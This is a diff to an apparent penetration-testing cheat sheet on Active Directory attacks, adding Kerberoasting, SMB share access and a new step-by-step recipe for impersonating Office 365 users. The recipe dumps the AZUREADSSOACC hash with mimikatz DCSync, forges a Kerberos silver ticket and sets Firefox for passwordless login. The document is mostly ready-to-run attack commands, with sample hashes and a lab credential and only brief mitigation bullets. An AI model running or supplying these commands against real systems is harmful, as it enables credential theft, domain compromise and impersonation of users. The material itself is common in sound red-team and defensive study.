@@ -17,7 +17,7 @@
   * [Password in AD User comment](#password-in-ad-user-comment)
   * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
   * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
-  * [Kerberoast](#kerberoast)
+  * [Kerberoasting](#kerberoasting)
   * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
@@ -34,6 +34,7 @@
   * [Password spraying](#password-spraying)
   * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
   * [PXE Boot image attack](#pxe-boot-image-attack)
+  * [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
 
 ## Tools
 
@@ -123,6 +124,13 @@
     Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
     ```
 
+* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
+    ```powershell
+    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
+    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
+    Install-Lab
+    Show-LabDeploymentSummary
+    ```
 
 ## Most common paths to AD compromise
 
@@ -229,6 +237,7 @@ ls            # list files
 Download a folder recursively
 
 ```powershell
+smbclient -U username //10.0.0.1/SYSVOL
 smbclient //10.0.0.1/Share
 smb: \> mask ""
 smb: \> recurse ON
@@ -505,11 +514,11 @@ root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
-### Kerberoast
+### Kerberoasting
 
 > "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)
 
-Any valid domain user can request a kerberos ticket for any domain service with `GetUserSPNs`. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
+Any valid domain user can request a kerberos ticket (TGS) for any domain service with `GetUserSPNs`. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
 ```powershell
 $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
@@ -535,6 +544,10 @@ Then crack the ticket with hashcat or john
 hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ./john ~/hash.txt --wordlist=rockyou.lst
 ```
+
+Mitigations: 
+* Have a very long password for your accounts with SPNs
+* Make sure no users have SPNs
 
 ### KRB_AS_REP Roasting
 
@@ -830,6 +843,12 @@ Extract the base64 TGT from Rubeus output and load it to our current session.
 
 Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
 
+
+#### Mitigation
+
+* Ensure sensitive accounts cannot be delegated
+* Disable the Print Spooler Service
+
 ### Resource-Based Constrained Delegation
 
 Resource-based Constrained Delegation was introduced in Windows Server 2012. 
@@ -1073,8 +1092,44 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     ```
 
 
+### Impersonating Office 365 Users on Azure AD Connect
+
+Prerequisites: 
+
+* Obtain NTLM password hash of the AZUREADSSOACC account
+    ```powershell
+    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+    ```
+
+* AAD logon name of the user we want to impersonate (userPrincipalName or mail)
+    ```powershell
+    elrond@contoso.com
+    ```
+
+* SID of the user we want to impersonate
+    ```powershell
+    S-1-5-21-2121516926-2695913149-3163778339-1234
+    ```
+
+
+Create the Silver Ticket and inject it into Kerberos cache:
+```powershell
+mimikatz.exe "kerberos::golden /user:elrond
+/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
+/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
+/target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
+```
+
+Launch Mozilla Firefox, go to about:config
+```powershell
+network.negotiate-auth.trusted-uris="https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com".
+```
+
+Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.
+
 ## References
 
+* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
 * [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
@@ -1130,3 +1185,4 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
+* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
